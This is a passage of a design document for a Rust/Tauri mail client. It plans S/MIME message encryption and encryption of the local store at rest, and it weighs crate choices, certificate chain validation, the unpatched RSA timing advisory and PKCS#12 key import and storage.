# Mail Encryption — Plan B: S/MIME end-to-end, and the local store at rest

*Companion to `docs/mail_client_plan_a.md` (host integration) and
`docs/mail_client_plan_b.md` (threat model, sanitizer, transport, attachments).
Plan B §6 deferred "PGP / S-MIME" with a one-line note on what a later phase
would need. This is that phase, written against the code that actually shipped
on 2026-07-26 rather than against the sketch.*

**Two distinct problems live in this document and they must not be conflated.**

1. **End-to-end message encryption** — S/MIME (RFC 8551) primarily, OpenPGP
   (RFC 3156) as a secondary track. Protects a message *in transit and on the
   provider's servers*, against everyone who is not the intended recipient.
   Applies only to accounts and correspondents that have keys.
2. **Local store encryption at rest** — the SQLite index, the body cache, the
   blobs, the drafts, the staged attachments. Protects *this machine's copy*
   against offline access to the disk. Applies to **all** cached mail, whether
   or not any of it was ever end-to-end encrypted.

They share exactly one thing — a key hierarchy (§10.6) — and they defend against
disjoint attackers. §10 is not an appendix to the S/MIME work; it is **Phase 1**,
and the S/MIME work is sequenced behind it for a reason stated there.

---

## 0. Crate selection (verified 2026-07-28 against crates.io and docs.rs, not from memory)

### 0.1 What is already in the tree (reuse, don't duplicate)

| Have | Where | What it buys the crypto work |
|---|---|---|
| `mail-parser 0.11` | `services/mail_engine.rs` | Parses the *outer* message and, unchanged, the *decrypted inner* one. The caps in `parse_bounded`/`check_structure` apply to both. |
| `mail-builder 0.4` (via `mail-send`) | `mail_engine::build_outgoing` | Builds the RFC 5322 entity that gets wrapped. **No change to `build_outgoing` is needed at any phase** — it already returns `Vec<u8>`, which is exactly the seam the crypto layer needs. Every header-injection test stays valid. |
| `ammonia 4` | `services/mail_sanitize.rs` | Sanitizes the decrypted body on the same path as any other body. |
| `rustls 0.23` + **`ring`** provider | `mail_engine::install_crypto_provider` | The process-wide `CryptoProvider`. Its `SignatureVerificationAlgorithm` set (RSA-PKCS1-SHA256/384/512, RSA-PSS, ECDSA-P256/384-SHA256/384) is **exactly the S/MIME signature-verification set**. See §2.4 — this is why signature verification needs no new asymmetric crate at all. |
| `rustls-webpki 0.103` | transitive under `rustls` | RFC 5280 path building with `KeyUsage::required(oid)` and `RevocationOptions`. See §2.4 and §4. |
| `rustls-platform-verifier 0.7` | `mail_engine::tls_config` | **Cannot be reused for S/MIME.** §4.1 says why, at length. |
| `rustls-native-certs` | transitive under `reqwest` | The OS trust store as a flat anchor set. §4.2. |
| `keyring 3` + `services/remote_credentials.rs` | | The 4 s `read_timed` bound, `cached_keyring_state()`, the keyutils cache, `remember_secret`'s never-delete-on-unreadable guard, `RememberOutcome`. §3.4 and §10.6 reuse this module rather than adding a second keychain path (a tripwire in `commands/browser.rs`'s test suite already forbids a second one). |
| `zeroize 1` + `mail_engine::Password` | | The `Zeroizing<String>` + redacting-`Debug` pattern, reused verbatim for passphrases and key material. |
| `sha2 0.10` | `mail_store::hex_digest` | Content addressing; becomes keyed in §10.4. |
| `rusqlite 0.40` (**`bundled`**) | `services/mail_store.rs` | The index. `bundled` is load-bearing for §10.2's rejection of SQLCipher. |
| `tauri-plugin-dialog` | `commands/mail.rs` | The backend-raised OS open/save dialog — the *only* way a file crosses the boundary. `.p12` import and key export reuse it, so no `mail_*` command gains a path argument. |

### 0.2 Verified crate status for the new work

Checked on 2026-07-28 via `cargo info` and the crates.io sparse index. **The
prerelease/advisory column is the whole argument of §2 and must be re-checked
before Phase 0 starts, not assumed from this table.**

| Crate | Latest stable | Latest any | Status / caveat |
|---|---|---|---|
| `der` | **0.8.1** | 0.8.1 | Stable. The ASN.1 engine everything below sits on. |
| `const-oid` | **0.10.2** | 0.10.2 | Stable. OID constants + the `db` feature. |
| `spki` | **0.8.0** | 0.8.0 | Stable. `SubjectPublicKeyInfo`, `AlgorithmIdentifier`. |
| `x509-cert` | **0.3.0** | 0.3.0 | Stable. Modules: `anchor attr builder certificate crl ext name request serial_number time`. **No path/chain validation module exists.** Parsing and building only. |
| `cms` | **0.2.3** | 0.3.0-pre.2 | Stable line is 0.2.x, pinned to `x509-cert 0.2`/`der 0.7`. **Types plus *builders* only — there is no `decrypt`, no `verify`, no `open` anywhere in the crate.** Verified from the full item index of 0.2.3: `builder::{EnvelopedDataBuilder, SignedDataBuilder, KeyTransRecipientInfoBuilder, KeyAgreeRecipientInfoBuilder, KekRecipientInfoBuilder, PasswordRecipientInfoBuilder}` and the `enveloped_data`/`signed_data` ASN.1 types. Nothing that opens or checks anything. |
| `pkcs12` | **0.1.0** | 0.2.0-pre.0 | Types + an optional `kdf` feature (the RFC 7292 B.2 KDF). **No "load this .p12 and give me (key, chain)" API.** The whole PFX → AuthenticatedSafe → SafeBag → shroudedKeyBag walk, the MAC check and the PBE decryption are ours to write. |
| `pkcs8` | **0.11.0** | 0.11.0 | Stable. `EncryptedPrivateKeyInfo` + `encryption` feature (PBES2 via `pkcs5`). |
| `pkcs5` | **0.8.1** | 0.8.1 | Stable. PBES2 (PBKDF2 + AES-CBC) — modern `.p12` files. Legacy files need `pkcs12/kdf` + `rc2` + `des` instead. |
| `rsa` | **0.9.10** | 0.10.0-rc.18 | **RUSTSEC-2023-0071 (CVE-2023-49092), `patched = []` as of today.** Marvin timing side channel in *private-key* operations. Unfixed on both lines. This is the single most consequential fact in the document; §2.5 and §11.3 deal with it. |
| `p256` / `p384` | **0.14.0** | 0.14.0 | Stable. ECDH + ECDSA. |
| `aes` / `cbc` | 0.9.1 / 0.2.1 | | Stable. Note `cbc`'s PKCS#7 unpad is **not** constant-time — §11.2. |
| `aes-kw`, `ansi-x963-kdf` | | | Needed for `kari` (ECDH) recipients. |
| `rc2`, `des` | 0.9.0 / 0.9.0 | | Legacy `.p12` PBE only. **Never** for message content — §11.8. |
| `chacha20poly1305` | **0.11.0** | 0.11.0 | Stable. XChaCha20-Poly1305 for §10. |
| `aes-gcm` | **0.11.0** | 0.11.0 | Stable. The alternative AEAD for §10, and the only way to read RFC 5084 `AuthEnvelopedData`. |
| `argon2` | 0.5.x | 0.6.0-rc.8 | Pin the **0.5 stable line** for §10.6's KDF; 0.6 is an rc. |
| `hkdf` | **0.13.0** | 0.13.0 | Stable. Domain separation in §10.6. |
| `pgp` (rPGP) | **0.20.0** | 0.20.0 | Stable, MIT/Apache-2.0, pure Rust. **Unlike `cms`, it implements encrypt/decrypt/sign/verify end to end.** Default features pull `bzip2` — a C dependency and a decompression-bomb channel; `default-features = false` drops both. §12. |
| `sequoia-openpgp` | 2.4.1 | | **Rejected**: LGPL-2.0-or-later (the repo is MIT OR Apache-2.0) and its default backend is `crypto-nettle`, a C library. |
| `openssl` / `openssl-sys` | 0.9.117 | | The Option B stack. §2.6. |
| `aws-lc-rs` | 1.17.3 | | **Not an option for S/MIME**: aws-lc-rs exposes no CMS/PKCS#7 API at all, and BoringSSL (its base) removed the PKCS#7/CMS module. Named here only so it is not proposed later. |

### 0.3 Prescribed `Cargo.toml` additions

Written in the file's existing house style — every dependency carries the reason
it is there and the reason its features are what they are. Added **per phase**,
not all at once; a crate with no call sites is a supply-chain liability.

```toml
# ── Mail: local store at rest (see docs/mail_encryption_plan_b.md §10) ───────
# One AEAD for every sealed record in the mail store. XChaCha20-Poly1305 rather
# than AES-GCM for one reason: the 192-bit random nonce makes reuse a
# non-problem under plain `OsRng`, where AES-GCM's 96-bit nonce needs a counter
# that must survive a crash AND a restore-from-backup — and a restored counter
# is precisely how GCM nonce reuse happens in the field. Pure Rust, no OpenSSL,
# and no dependence on AES-NI being present (this ships to whatever the user has).
chacha20poly1305 = "0.11"
# Domain separation: one master key, N purpose-bound subkeys (db fields, blob
# bytes, blob addressing, identity-key wrapping). Compromise of one does not
# hand over the others, and a purpose string is cheaper than a second key file.
hkdf = "0.13"
# Password-based key derivation for the passphrase unlock path. Argon2id, with
# the parameters recorded IN the key file so they can be raised later without
# stranding an existing store. Pinned to the 0.5 stable line — 0.6 is an rc.
argon2 = "0.5"
# CSPRNG for nonces, the master key, and the blob-addressing key. Named directly
# rather than reached through a re-export so there is exactly one RNG.
rand_core = { version = "0.6", features = ["getrandom"] }

# ── Mail: S/MIME (see docs/mail_encryption_plan_b.md §2) ─────────────────────
# ADDED ONLY AFTER PHASE 0's SPIKE PASSES. See §2.7 — if it fails, none of the
# block below is added and the plan moves to the OpenPGP track in §12.
# ASN.1. `cms` and `x509-cert` are TYPE LIBRARIES AND BUILDERS: neither opens an
# EnvelopedData nor verifies a SignedData nor validates a chain. The opening,
# the verification and the trust decision are ours (services/mail_smime.rs,
# services/mail_trust.rs), which is the entire cost centre of this feature.
cms = "0.2"
x509-cert = "0.3"
der = "0.8"
const-oid = { version = "0.10", features = ["db"] }
# PKCS#12 import. `kdf` is the legacy RFC 7292 B.2 derivation, needed because a
# .p12 exported by anything older than OpenSSL 3 uses pbeWithSHAAnd3-KeyTripleDES
# for the key and pbeWithSHAAnd40BitRC2 for the certs. `rc2`/`des` exist SOLELY
# for that path and are refused for message content (§11.8).
pkcs12 = { version = "0.1", features = ["kdf"] }
pkcs8 = { version = "0.11", features = ["encryption"] }
pkcs5 = "0.8"
rc2 = "0.9"
des = "0.9"
# Content decryption. AES-CBC is what real S/MIME uses; `aes-gcm` is here for
# RFC 5084 AuthEnvelopedData, which `cms` cannot even represent (§7.2).
aes = "0.9"
cbc = "0.2"
# Recipient key unwrap. `rsa` is the ONE dependency added under a live RUSTSEC
# advisory (RUSTSEC-2023-0071, Marvin, patched = []); it is used for PRIVATE-KEY
# DECRYPTION ONLY — every signature *verification* goes through webpki/ring,
# which has no such advisory. §2.5 states the mitigation and §16 q10 asks whether
# to accept it at all.
rsa = "0.9"
# ECDH recipients (`kari`): ephemeral-static ECDH, the ANSI X9.63 KDF, and the
# AES key wrap that carries the CEK.
p256 = "0.14"
p384 = "0.14"
aes-kw = "0.2"
ansi-x963-kdf = "0.1"
```

**Deliberately not added:** `rustls-platform-verifier` for certificates (already
present, and wrong — §4.1); SQLCipher via `rusqlite/sqlcipher` (§10.2);
`sequoia-openpgp` (§0.2); any `openssl*` crate (§2.6); `tempfile` in any mail
module (§10.9, enforced by a tripwire).

---

## 1. What "S/MIME" actually means, stated before anything is chosen

The trade-off table in §2 is meaningless without the requirement list it is
scored against. A mail client that claims S/MIME support must, on the **receiving**
side — which is where 90 % of the work and 100 % of the security lives:

1. Recognise `application/pkcs7-mime` with `smime-type=enveloped-data`,
   `signed-data`, `certs-only`, `compressed-data`, and `authEnveloped-data`;
   `multipart/signed; protocol="application/pkcs7-signature"`; and the still-common
   `application/x-pkcs7-*` aliases.
2. **Open an `EnvelopedData`**: walk `RecipientInfos`, match one against a held
   certificate by `IssuerAndSerialNumber` *or* `SubjectKeyIdentifier`, then
   - `ktri` — RSA private-key decrypt the CEK under `rsaEncryption`
     (RSAES-PKCS1-v1_5, overwhelmingly the deployed case) or `id-RSAES-OAEP`;
   - `kari` — ephemeral-static ECDH against the originator's public key, run the
     ANSI X9.63 KDF over the shared secret and the UKM, then AES-unwrap the CEK;
   then decrypt `EncryptedContentInfo` under AES-128/256-CBC (dominant), 3DES-CBC
   (legacy), or AES-GCM (RFC 5084, a *different* CMS content type).
3. **Verify a `SignedData`**: digest the encapsulated content — or, for a
   detached signature, the **exact CRLF-canonicalized bytes of the signed MIME
   part**, headers included, which is where implementations most often disagree —
   then, when `signedAttrs` is present (it nearly always is), check the
   `messageDigest` attribute against that digest and verify the signature over the
   **DER re-encoding of `SignedAttributes` with the implicit `[0]` tag replaced by
   a `SET OF` tag**. That re-tagging rule is the single most frequently
   mis-implemented line in RFC 5652 and it fails *open* when you get it wrong.
4. **Build and validate a chain** from the signer certificate to a trusted root:
   signature verification at each link, validity windows, `basicConstraints`
   (`cA` and `pathLenConstraint`), `keyUsage`, `extendedKeyUsage` containing
   `id-kp-emailProtection` (1.3.6.1.5.5.7.3.4), name constraints, and — the part
   no generic PKI library does for you — matching the certificate's `rfc822Name`
   SAN (or the legacy `emailAddress` RDN) against the **visible `From:` header**.
5. **Check revocation**: CRL distribution points, or OCSP.

And on the **sending** side: build a `SignedData` over a canonicalized MIME
entity, build an `EnvelopedData` addressed to N recipients plus yourself, and
choose algorithms that Outlook and Thunderbird will accept.

Items 2–4 are where the trade-off is decided. Item 1 is a `match` on a MIME type.
Item 5 is §4.4.

---

## 2. The crux: which crypto stack

### 2.1 The constraint, restated so it can be weighed rather than assumed

`src-tauri/Cargo.toml` states the rule three times, in three unrelated places,
each with its own reasoning:

- mail TLS (line ~113): *"The one TLS stack for both protocols. rustls (no
  OpenSSL anywhere in the bundle) with the OS trust store."*
- `mail-send` (line ~106): default features off, `ring` instead of `aws_lc_rs`,
  *"which needs no cmake on the Windows runner."*
- `reqwest` (line ~147): *"`default-features = false` drops native-tls (no
  OpenSSL anywhere in the bundle, same as mail)."*

And `services/mail_engine.rs`'s module header makes it a security property, not a
packaging preference: *"No certificate escape hatch, anywhere… A test scans this
file's own source for the strings that would introduce a bypass."*

The rule is not "we dislike C". It is: **the bytes that arrive from a network
socket are parsed by memory-safe code, and there is exactly one crypto stack, so
there is exactly one place a bypass could be added and one test that watches it.**
Any option below has to be scored against *that* sentence, not against a slogan.

### 2.2 Option A — pure RustCrypto, full S/MIME

Use `cms` + `x509-cert` + `pkcs12` + `rsa` + `p256` + `aes`/`cbc`, and write the
missing halves ourselves.

What we would be writing, in this repository, as new security-critical code over
attacker-controlled input:

| Piece | Rough size | Failure mode if wrong |
|---|---|---|
| `EnvelopedData` opening (recipient match, `ktri`/`kari` unwrap, content decrypt) | 400–600 LOC | Wrong-recipient decrypt; padding oracle; nothing happens (visible). |
| `SignedData` verification incl. the `signedAttrs` re-tag | 300–500 LOC | **Fails open.** A message verifies as signed by someone who did not sign it. |
| **RFC 5280 path building + validation** | **1500–2500 LOC** | **Fails open, catastrophically.** The historical CVE list here is: `basicConstraints` unchecked (any leaf becomes a CA), name-constraint bypass, algorithm confusion, `pathLen` ignored, signature-algorithm/key mismatch, time handling. Every one of these is a "your bank's certificate is now issued by the attacker" bug. |
| PKCS#12 loading incl. legacy RC2/3DES PBE and the HMAC-SHA1 MAC | 400–600 LOC | Import fails (visible), or a MAC nobody checked. |
| CRL parse + revocation decision | 200–400 LOC | Revoked certificates accepted. |

The chain validator is the disqualifier. It is not that it is long; it is that it
is the one component in the list whose bugs are **silent and fail open**, and the
one that this project has no way to test adequately — the real test suites for
path validation are things like BetterTLS and the NIST PKITS corpus, which are
thousands of cases and are not going to be maintained here alongside everything
else. Writing one would contradict, directly, the sentence that justified
`mail-parser`: *"this is the crate that eats attacker-controlled bytes first, so
its memory-safety story is the whole argument."* Memory safety we would have.
Logic safety we would not, and a chain validator is a pure logic problem.

**Option A as stated is rejected.** But see §2.4, which removes the disqualifier.

### 2.3 The honest gap list, stated precisely

So there is no ambiguity about what "pure-Rust S/MIME" does and does not exist:

| Requirement (§1) | Pure-Rust availability | Verdict |
|---|---|---|
| Parse CMS `ContentInfo`/`SignedData`/`EnvelopedData` | `cms 0.2.3` types | **Exists.** |
| Build `SignedData` / `EnvelopedData` | `cms::builder` | **Exists** (`SignedDataBuilder`, `EnvelopedDataBuilder`, `KeyTrans*`/`KeyAgree*` recipient builders). |
| Represent RFC 5084 `AuthEnvelopedData` (AES-GCM) | — | **Missing.** `cms::authenticated_data::AuthenticatedData` is RFC 5652 MAC'd data, a *different* type. GCM-enveloped mail cannot be represented at all → must be hand-rolled or refused cleanly (§7.2). |
| Open `EnvelopedData` | — | **Missing.** Ours. |
| Verify `SignedData` | — | **Missing.** Ours, ~400 LOC, mechanical, fixture-testable. |
| RSA verify (PKCS1-v1.5 / PSS, SHA-256/384/512) | `ring` **via webpki** (already in tree) | **Exists**, no new crate, **no RUSTSEC advisory**. §2.4. |
| ECDSA verify (P-256/P-384) | `ring` via webpki | **Exists.** |
| RSA private-key decrypt | `rsa 0.9` | Exists, **under an unpatched advisory**. §2.5. |
| ECDH + X9.63 KDF + AES-KW | `p256`/`p384` + `ansi-x963-kdf` + `aes-kw` | **Exists.** |
| AES-CBC content decrypt | `aes` + `cbc` | Exists; unpadding is not constant-time. §11.2. |
| Parse X.509 | `x509-cert 0.3` | **Exists**, incl. SAN/EKU/basicConstraints extension types. |
| **Build + validate a chain** | `x509-cert`: **no**. `rustls-webpki 0.103`: **yes** | **Exists, in a crate already in the dependency tree.** §2.4. |
| EKU = `emailProtection` | `webpki::KeyUsage::required(oid)` | **Exists** — verified on docs.rs: `pub const fn required(oid: &'static [u8]) -> Self`. |
| CRL revocation | `webpki::RevocationOptions` | **Exists.** |
| OCSP | — | Missing, and **not wanted** (§4.4). |
| `rfc822Name` SAN vs `From:` | `x509-cert::ext::pkix::name::GeneralName` | Exists as a parse; the *comparison rule* is ours (~50 LOC, pure, exhaustively testable). |
| PKCS#12 import (modern PBES2) | `pkcs12` + `pkcs8/encryption` + `pkcs5` | Exists as parts; the assembly is ours. |
| PKCS#12 import (legacy RC2/3DES) | `pkcs12/kdf` + `rc2` + `des` | Exists as parts; assembly ours. |

### 2.4 The finding that changes the answer: `rustls-webpki` is already here and can do the chain

Verified on docs.rs, 2026-07-28, `rustls-webpki 0.103.13`:

```rust
pub fn verify_for_usage<'p>(
    &'p self,
    supported_sig_algs: &[&dyn SignatureVerificationAlgorithm],
    trust_anchors: &'p [TrustAnchor<'_>],
    intermediate_certs: &'p [CertificateDer<'p>],
    time: UnixTime,
    usage: impl ExtendedKeyUsageValidator,
    revocation: Option<RevocationOptions<'_>>,
    verify_path: Option<&dyn Fn(&VerifiedPath<'_>) -> Result<(), Error>>,
) -> Result<VerifiedPath<'p>, Error>;

pub const fn required(oid: &'static [u8]) -> KeyUsage;      // on KeyUsage
pub fn verify_signature(&self, alg: &dyn SignatureVerificationAlgorithm,
                        msg: &[u8], signature: &[u8]) -> Result<(), Error>;
```

Three things follow, and together they are the reason this plan recommends
pure Rust after all:

1. **Path validation is name-agnostic.** Hostname checking is a *separate*
   method (`verify_is_valid_for_subject_name`) that we simply do not call. So
   `verify_for_usage` gives us signature-chaining, validity windows,
   `basicConstraints`, `pathLen`, name constraints, EKU and CRL revocation —
   written by the rustls team, fuzzed, and already compiled into this binary.
   The `verify_path` callback is where our own `rfc822Name`-vs-`From` rule and
   any policy check hang.
2. **`KeyUsage::required(EMAIL_PROTECTION_OID)`** makes it an *email* validator
   rather than a TLS one. This is the specific API that makes reuse legitimate
   instead of a hack.
3. **`EndEntityCert::verify_signature` is public**, and the algorithm set comes
   from `ring`, which the process already installs. So **CMS signature
   verification needs no new asymmetric crate at all** — not `rsa`, not `p256`.
   Verification is a public-key operation and RUSTSEC-2023-0071 does not touch
   it.

That last point is what produces the phase split in §13: **Phase 3 (verify signed
mail) is pure Rust with zero advisories and zero new asymmetric dependencies.
Phase 4 (decrypt) is the only phase where the hard dependency decision bites.**
Shipping Phase 3 alone already delivers most of the workplace value — at an
institution the common case is *receiving* signed mail and wanting to know
whether the signature is real.

**Risk to retire in Phase 0**, stated rather than assumed: `rustls-webpki` is
written for the Web PKI and is deliberately strict. Real-world S/MIME
certificates — especially enterprise/university ones — may carry extensions,
name forms or encodings it rejects. Whether it accepts a corpus of *actual*
issued personal certificates is not knowable from the API docs and is Phase 0's
first exit criterion. If it rejects them, the fallback is not "write a chain
validator"; it is §2.6.

### 2.5 The `rsa` advisory, and why it is a design input rather than a footnote

`RUSTSEC-2023-0071` / `CVE-2023-49092`, filed 2023-11-22, `patched = []` — still
unpatched on both the 0.9 stable line and the 0.10 release candidates as of
2026-07-28. Marvin: a non-constant-time RSA private-key operation leaks key bits
through timing.

Why this matters more for a mail client than the advisory's own text suggests.
The advisory says the workaround is *"avoid using the `rsa` crate in settings
where attackers are able to observe timing information, e.g. local use on a
non-compromised computer is fine."* A desktop mail client looks like the safe
case. It is not, quite, because **an attacker chooses how many ciphertexts we
decrypt and when**. Any per-message observable — an error banner, a distinct
icon, a rendering delay, a read receipt, an outbound fetch — is a Bleichenbacher
oracle against RSAES-PKCS1-v1_5, and the timing channel makes it a Marvin oracle
even without a padding-error distinction.

The mitigations are **structural, in §11.3**, and they are what actually carry
the defence:

- **Decryption happens only when the user opens a message.** Never during sync,
  never on the arrival poll, never to build a preview. An attacker who sends a
  million crafted messages gets a million *unopened rows*, not a million oracle
  queries. This rule alone reduces the query budget from "unbounded and
  automated" to "however many messages a human clicks", and it is consistent
  with the mail client's existing posture that *nothing reaches the network on
  its own*.
- **Exactly one failure state on the wire.** `decryption_failed`, with no
  distinguishable sub-reason crossing the IPC boundary.
- **`cargo audit` will flag `rsa` forever**, so its presence must be an explicit,
  documented acceptance in `Cargo.toml` and in §16 q10, not something discovered
  in CI later.

### 2.6 Option B — an OpenSSL binding, costed honestly

The only real C option is **OpenSSL ≥ 3 `libcrypto`** via the `openssl` crate:
`SMIME_read_CMS`, `CMS_verify`, `CMS_decrypt`, `CMS_encrypt`, `CMS_sign`,
`PKCS12_parse`, `X509_STORE_CTX`. BoringSSL removed PKCS#7/CMS and `aws-lc-rs`
never exposed it, so "use aws-lc instead" is not available; LibreSSL has CMS but
is not packaged on Windows.

| Axis | Cost |
|---|---|
| **The stated invariant** | Broken, and not narrowly. The binary would contain a second, C, TLS-capable crypto stack. The rustls argument ("memory-safe code parses network bytes") does not stop applying because we only *meant* to use libcrypto for CMS — CMS parsing *is* parsing network bytes. The three `Cargo.toml` comments and `mail_engine.rs`'s header would all become false and would have to be rewritten to say something weaker. |
| **Linux** | Either dynamically link the distro's `libssl`/`libcrypto` (ABI and packaging vary across distros; an AppImage then carries a version assumption) or vendor `openssl-src` and build OpenSSL from source in CI (+3–6 min per job, adds a perl build dependency). |
| **Windows (CI-verified only)** | No OpenSSL on the runner. `openssl-src` needs **perl and NASM** — the exact class of build dependency `mail-send` was put on `ring` to avoid ("which needs no cmake on the Windows runner"). Per `project_os_support`, Windows is verified only by a green workflow: a linker failure here is debugged by pushing commits and reading logs. |
| **macOS (cannot be compiled locally at all)** | Homebrew OpenSSL is not on the runner by default; `openssl-src` again. A `-framework`/linker problem is unverifiable except through CI, and per `project_macos_support` macOS `cfg` blocks already cannot be compile-checked here. |
| **Licensing** | Not a blocker. OpenSSL 3 is Apache-2.0, compatible with the repo's `MIT OR Apache-2.0`. (aws-lc is `ISC AND (Apache-2.0 OR ISC)` — also fine, but irrelevant per above.) |
| **Maintenance** | An ongoing CVE-tracking commitment for a C library, for a side feature, on three platforms. Compare `docs/browser_plan_*`'s reason for deferring #61a: *"It would buy a browser's patch cadence, permanently."* Same shape of argument. |
| **Audit status** | Strongly in OpenSSL's favour: `CMS_verify`/`CMS_decrypt` are twenty-year-old, universally-deployed code. This is the one axis where Option B wins outright and it should be conceded plainly. |
| **What it buys** | Everything in §1, correctly, including the chain validator and the PKCS#12 loader, for roughly 300 LOC of FFI glue instead of ~3000 LOC of our own crypto. |

**Option B is the right answer for a general-purpose mail client and the wrong
answer for this one** — but only because §2.4 removed the piece that would
otherwise have forced it. If Phase 0 shows webpki cannot validate real-world
S/MIME certificates, Option B stops being avoidable and the decision goes back to
the user (§16 q1), where the honest alternative is "drop S/MIME, ship OpenPGP"
(§12), because rPGP needs no C and no chain validator.

### 2.7 Recommendation

**Option C — pure Rust, scope-narrowed: `cms`/`x509-cert`/`der` for the ASN.1,
our own ~900 LOC of CMS open/verify glue, `rustls-webpki` for every trust
decision, `ring` (already installed) for every signature verification, and `rsa`
only for private-key decryption behind the structural mitigations of §11.3.**

Is pure-Rust S/MIME *actually viable*? **Yes, conditionally, and the condition is
testable in a day.** The viability rests entirely on `rustls-webpki` accepting
real issued personal certificates. Phase 0 exists to answer exactly that, before
a single line of feature code is written, and its failure branch is written down
in advance so it is a decision rather than a crisis.

What is **not** viable and is refused rather than approximated:

- Writing our own path validator (§2.2).
- OCSP (§4.4).
- `AuthEnvelopedData` / AES-GCM enveloping — `cms` cannot represent it, so it is
  **detected and refused with a named reason**, never half-parsed (§7.2).
- Smartcard / PKCS#11 / non-exportable platform keys — a different plan (§16 q8).

---

## 3. Certificate and key management

### 3.1 How a user actually gets a certificate, and what that implies

At a workplace or university, a personal S/MIME certificate arrives as a
**PKCS#12 file** (`.p12` / `.pfx`) that the user downloads from an internal CA
portal, or exports out of Outlook/Thunderbird/the platform keychain. That is the
one universal, cross-platform, cross-issuer path, so it is the one Eldrun
implements. Everything else in this section follows from that.

Import flow — **no `mail_*` command gains a path argument**, so it reuses
`mail_attach_pick`'s exact mechanism:

```
Settings → Mail → Security → "Import certificate…"
  └─ mail_identity_import(passphrase: String)          ← no path parameter
      └─ backend raises the OS OPEN dialog (DialogExt, callback→oneshot,
         never blocking_pick_file — commands/mail.rs rule 1)
          └─ read bytes, parse PFX, verify the MAC, decrypt the shrouded key
              └─ re-wrap the private key under the identity key (§10.6)
                  └─ write <state_dir>/mail/certs/<id>.key  (0600, sealed)
                     write <state_dir>/mail/certs/<id>.chain.der (0600, plain —
                       certificates are public by definition)
                        └─ return MailIdentity { id, subject, rfc822_names,
                             fingerprint_sha256, issuer, not_before, not_after,
                             key_alg, usages }   ← metadata only, never key bytes
```

The passphrase crosses IPC **once, inbound**, in a `Zeroizing<String>`, is never
returned, never echoed in an event, never interpolated into an error string —
the `Password` type in `mail_engine.rs` is reused verbatim, including its
redacting `Debug`.

PKCS#12 has two eras and both must load or the feature is useless in practice:

- **Legacy** (anything exported by OpenSSL < 3, and a great many CA portals):
  `pbeWithSHAAnd3-KeyTripleDES-CBC` for the key bag,
  `pbeWithSHAAnd40BitRC2-CBC` for the cert bag, HMAC-SHA1 MAC, RFC 7292 B.2 KDF.
  Needs `pkcs12/kdf` + `des` + `rc2` + `sha1`.
- **Modern** (OpenSSL 3 default): PBES2 = PBKDF2-HMAC-SHA256 + AES-256-CBC,
  HMAC-SHA256 MAC. Needs `pkcs8/encryption` + `pkcs5`.

**SHA-1 and RC2 here are fine and their presence is not a downgrade**, and the
code comment must say so, because the next reader will otherwise "fix" it: the
security of a `.p12` is its passphrase and its MAC over a file the user chose
from their own disk, not the cipher inside it. The same primitives are **refused
outright for message content** (§11.8), and that asymmetry is the point.

### 3.2 Where the private key lives

**An encrypted file under `<state_dir>/mail/certs/`, sealed with a key derived
from the store master key (§10.6). Not the OS keychain.**

| Candidate | Verdict |
|---|---|
| Plaintext PKCS#8 on disk | No. |
| OS keychain (`keyring`) | **No**, for four reasons that compound. (a) Size: `keyring` stores *strings*; a base64'd encrypted RSA-4096 PKCS#8 blob is ~2.5 KB, and Windows Credential Manager's `CRED_MAX_CREDENTIAL_BLOB_SIZE` is 2560 bytes — a limit we would sit exactly on top of, failing for some keys and not others. (b) The Linux backend is configured with `linux-native-sync-persistent`, i.e. a **kernel keyutils cache**; caching a *password* in kernel memory for a boot is a considered trade-off, caching a *long-lived private key* there is a different one nobody made. (c) The locked-collection failure class: a locked keyring would make the mailbox undecryptable, which is precisely plan B §5.2's objection. (d) It would be a second thing to unlock. |
| Encrypted file under the store key hierarchy | **Yes.** One unlock covers store *and* identity; the file is ordinary bytes so size is a non-issue; corruption is one identity, not the mailbox; and export (below) is trivial. |

Passphrase policy:

- The `.p12` passphrase is used **once, at import**, and is never stored. It is
  not reused as the store passphrase, and the dialog says so — users otherwise
  assume the two are the same and are surprised when changing one does nothing.
- **Export exists and is offered at import time.** `mail_identity_export` re-wraps
  the identity as a fresh `.p12` under a passphrase the user types, written
  through the backend-raised OS **save** dialog (`mail_attachment_save`'s
  mechanism). This is not a convenience: a mail store is a *cache* and can be
  deleted and re-synced, but a private key is **irreplaceable** — losing it means
  losing every message ever encrypted to you. The import dialog says exactly that
  and offers the export in the same breath.
- The standing rule holds: **no secret is persisted by default**. Importing an
  identity is itself the explicit opt-in, and the *store unlock secret* — the
  thing that would let the key be read without a prompt — obeys §10.6's
  default-off "remember" checkbox with the `true | null` tri-state.

### 3.3 Should Eldrun read the OS certificate store?

**Split answer, and the split is the recommendation.**

- **Trust anchors (roots): yes, from the OS store.** Already the project's
  policy for TLS — *"a private CA is added by the system administrator rather
  than by an 'ignore certificate' checkbox this client does not have."* An
  institution that issues S/MIME certificates has pushed its root to managed
  machines already, so this makes the common case work with zero configuration.
  §4.2.
- **Identities (certificate + private key): no.** Import a `.p12`. Reasons, in
  order of weight:
  1. **A non-exportable key cannot be exported, only *used*.** On Windows that
     means driving CNG/NCrypt for every RSA operation; on macOS, `SecKeyDecrypt`
     against a Keychain identity. That is three platform-specific asymmetric
     code paths, two of which cannot be compiled or run on this machine
     (`project_os_support`, `project_macos_support`). One import path is one code
     path everywhere.
  2. **On Linux there is no OS certificate store.** The "store" would be
     Thunderbird's or Firefox's **NSS database inside their profile** — a foreign
     application's configuration directory, which the repo forbids outright
     (`feedback_no_foreign_app_paths`) and which `commands/browser.rs` already
     carries a tripwire against (*"no foreign-browser-profile access"*).
  3. **Silently adopting whatever identity another program installed is
     surprising.** A mail client that signs with a certificate the user did not
     choose in *this* app is a UI-truthfulness problem, not just a plumbing one.
  4. It would be a fourth secret-bearing store beside `keyring`,
     `remote_credentials` and the mail store, in a codebase whose stated rule is
     that there is exactly one of each.

  *Recipient* certificates are a different question and are §5.

### 3.4 The locked-keyring failure class, applied here

Even though the private key is not in the keychain, the **store unlock secret**
optionally is (§10.6), so every rule from `docs/context/remote_credentials.md`
applies to the crypto feature verbatim and is repeated because they are the
rules most likely to be re-broken:

- A locked collection renders as **"Keyring locked — unlock to read your local
  mail"** with the existing `keyring_unlock` button. **Never** as "no mail", and
  never as "no certificate imported".
- All reads go through `remote_credentials`, inheriting the 4 s `read_timed`
  bound, `cached_keyring_state()`'s refusal to dispatch into a locked collection,
  and the keyutils cache. **No new keychain path is added** — a tripwire already
  forbids one.
- **`false` is unrepresentable** on any remember flag: `rememberArg(checked) →
  true | null`, `Remember::{Save, Clear, Leave}`. An async keychain read that has
  not landed sends `false`, which *deletes the secret it just authenticated
